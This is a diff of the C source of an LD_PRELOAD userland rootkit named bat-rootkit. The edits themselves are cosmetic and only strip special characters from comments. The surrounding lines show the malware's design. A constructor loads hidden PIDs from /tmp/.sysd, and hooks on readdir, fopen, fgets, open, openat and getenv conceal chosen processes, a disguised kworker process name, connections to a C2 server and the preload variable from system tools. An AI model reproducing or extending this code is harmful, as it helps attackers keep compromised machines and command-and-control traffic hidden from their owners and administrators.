@@ -1,5 +1,5 @@
 /*
- * bat-rootkit.so — LD_PRELOAD parasite
+ * bat-rootkit.so   LD_PRELOAD parasite
  *
  * Loaded into every process via /etc/ld.so.preload.
  * Hides target PIDs from all userspace inspection tools.
@@ -11,10 +11,10 @@
  *   getenv               → hides LD_PRELOAD variable from child process inspection
  *
  * Build-time configuration (injected via -D flags):
- *   HIDE_MARK   — path to PID mark file written by bat-agent   (default: /tmp/.sysd)
- *   HIDE_COMM   — process comm name to hide                    (default: kworker/0:1H)
- *   C2_IP_HEX   — C2 server IP in /proc/net/tcp hex format     (default: empty = no net hide)
- *   C2_PORT_HEX — C2 server port in hex                        (default: empty)
+ *   HIDE_MARK     path to PID mark file written by bat-agent   (default: /tmp/.sysd)
+ *   HIDE_COMM     process comm name to hide                    (default: kworker/0:1H)
+ *   C2_IP_HEX     C2 server IP in /proc/net/tcp hex format     (default: empty = no net hide)
+ *   C2_PORT_HEX   C2 server port in hex                        (default: empty)
  */
 
 #define _GNU_SOURCE
@@ -46,12 +46,12 @@
 #define C2_PORT_HEX ""
 #endif
 
-/* ── Hidden PID list (loaded from HIDE_MARK at init) ── */
+/*  Hidden PID list (loaded from HIDE_MARK at init)  */
 #define MAX_HIDDEN 64
 static pid_t hidden_pids[MAX_HIDDEN];
 static int   hidden_count = 0;
 
-/* ── Original function pointers ── */
+/*  Original function pointers  */
 static struct dirent   *(*orig_readdir)(DIR *)             = NULL;
 static struct dirent64 *(*orig_readdir64)(DIR *)           = NULL;
 static FILE            *(*orig_fopen)(const char *, const char *)   = NULL;
@@ -61,7 +61,7 @@ static char            *(*orig_getenv)(const char *)       = NULL;
 static int              (*orig_open)(const char *, int, ...) = NULL;
 static int              (*orig_openat)(int, const char *, int, ...) = NULL;
 
-/* ── /proc/net/tcp wrapper state ── */
+/*  /proc/net/tcp wrapper state  */
 #define MAX_TCP_FPS 8
 static FILE *tcp_fps[MAX_TCP_FPS];
 static int   tcp_fp_count = 0;
@@ -86,7 +86,7 @@ static int is_tcp_fp(FILE *fp) {
     return 0;
 }
 
-/* ── Helpers ── */
+/*  Helpers  */
 
 static int is_all_digits(const char *s) {
     if (!s || !*s) return 0;
@@ -113,7 +113,7 @@ static int should_hide_pid(const char *name) {
         if (hidden_pids[i] == p) return 1;
     }
 
-    /* Check comm name — requires orig_fopen to be resolved */
+    /* Check comm name   requires orig_fopen to be resolved */
     if (!orig_fopen) return 0;
 
     char comm_path[64];
@@ -155,7 +155,7 @@ static int is_hidden_proc_path(const char *path) {
 
     const char *start = path + 6;
     const char *slash = strchr(start, '/');
-    if (!slash) return 0;  /* /proc itself or /proc/<pid> without slash — let readdir handle it */
+    if (!slash) return 0;  /* /proc itself or /proc/<pid> without slash   let readdir handle it */
 
     size_t len = (size_t)(slash - start);
     if (len == 0 || len >= 16) return 0;
@@ -194,7 +194,7 @@ static void load_hidden_pids(void) {
     fclose(f);
 }
 
-/* ── Constructor ── */
+/*  Constructor  */
 
 __attribute__((constructor))
 static void rootkit_init(void) {
@@ -211,7 +211,7 @@ static void rootkit_init(void) {
     load_hidden_pids();
 }
 
-/* ── Hook: readdir ── */
+/*  Hook: readdir  */
 
 struct dirent *readdir(DIR *dirp) {
     if (!orig_readdir) return NULL;
@@ -226,7 +226,7 @@ struct dirent *readdir(DIR *dirp) {
     return NULL;
 }
 
-/* ── Hook: readdir64 ── */
+/*  Hook: readdir64  */
 
 struct dirent64 *readdir64(DIR *dirp) {
     if (!orig_readdir64) return NULL;
@@ -241,7 +241,7 @@ struct dirent64 *readdir64(DIR *dirp) {
     return NULL;
 }
 
-/* ── Hook: fopen ── */
+/*  Hook: fopen  */
 
 FILE *fopen(const char *pathname, const char *mode) {
     if (!orig_fopen) return NULL;
@@ -263,7 +263,7 @@ FILE *fopen(const char *pathname, const char *mode) {
     return fp;
 }
 
-/* ── Hook: fopen64 ── */
+/*  Hook: fopen64  */
 
 FILE *fopen64(const char *pathname, const char *mode) {
     if (!orig_fopen64) return NULL;
@@ -284,7 +284,7 @@ FILE *fopen64(const char *pathname, const char *mode) {
     return fp;
 }
 
-/* ── Hook: fclose — clean up tcp tracker ── */
+/*  Hook: fclose   clean up tcp tracker  */
 
 int fclose(FILE *fp) {
     static int (*orig_fclose)(FILE *) = NULL;
@@ -294,7 +294,7 @@ int fclose(FILE *fp) {
     return orig_fclose(fp);
 }
 
-/* ── Hook: fgets — filter C2 connections from /proc/net/tcp ── */
+/*  Hook: fgets   filter C2 connections from /proc/net/tcp  */
 
 char *fgets(char *buf, int size, FILE *stream) {
     if (!orig_fgets) return NULL;
@@ -316,7 +316,7 @@ char *fgets(char *buf, int size, FILE *stream) {
     return NULL;
 }
 
-/* ── Hook: open — block direct syscall-level access to hidden paths ──
+/*  Hook: open   block direct syscall-level access to hidden paths  
  * cat, stat, many tools use open() not fopen(). This catches them. */
 
 int open(const char *pathname, int flags, ...) {
@@ -336,7 +336,7 @@ int open(const char *pathname, int flags, ...) {
     return orig_open(pathname, flags, mode);
 }
 
-/* ── Hook: openat ── */
+/*  Hook: openat  */
 
 int openat(int dirfd, const char *pathname, int flags, ...) {
     if (!orig_openat) return -1;
@@ -355,7 +355,7 @@ int openat(int dirfd, const char *pathname, int flags, ...) {
     return orig_openat(dirfd, pathname, flags, mode);
 }
 
-/* ── Hook: getenv — hide LD_PRELOAD ── */
+/*  Hook: getenv   hide LD_PRELOAD  */
 
 char *getenv(const char *name) {
     if (!orig_getenv) return NULL;
